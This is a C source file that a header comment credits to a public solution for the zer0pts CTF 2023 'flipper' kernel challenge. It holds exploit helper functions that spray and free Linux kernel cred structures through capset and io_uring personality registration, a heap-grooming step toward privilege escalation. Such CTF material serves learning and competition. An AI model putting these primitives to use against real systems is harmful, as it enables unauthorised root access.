/**
 * Copied from https://github.com/zer0pts/zer0pts-ctf-2023-public/tree/master/pwn/flipper/solution
 */

#include <unistd.h>
#include <sys/syscall.h>
#include <linux/capability.h>
#include "io_uring.h"
#include "cred.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdnoreturn.h>

static noreturn void fatal(const char *msg)
{
    perror(msg);
    exit(EXIT_FAILURE);
}

void delete_n_creds(int uring_fd, size_t n_creds)
{
    for (size_t i = 0; i < n_creds; i++) {
        if (syscall(SYS_io_uring_register, uring_fd, IORING_UNREGISTER_PERSONALITY, NULL, i + 1) < 0)
            fatal("io_uring_register() failed");
    }
}

void alloc_n_creds(int uring_fd, size_t n_creds)
{
    for (size_t i = 0; i < n_creds; i++) {
        struct __user_cap_header_struct cap_hdr = {
            .pid = 0,
            .version = _LINUX_CAPABILITY_VERSION_3
        };

        struct user_cap_data_struct cap_data[2] = {
            {.effective = 0, .inheritable = 0, .permitted = 0},
            {.effective = 0, .inheritable = 0, .permitted = 0}
        };

        /* allocate new cred */
        if (syscall(SYS_capset, &cap_hdr, (void *)cap_data))
            fatal("capset() failed");

        /* increment refcount so we don't free it afterwards*/
        if (syscall(SYS_io_uring_register, uring_fd, IORING_REGISTER_PERSONALITY, 0, 0) < 0)
            fatal("io_uring_register() failed");
    }
}
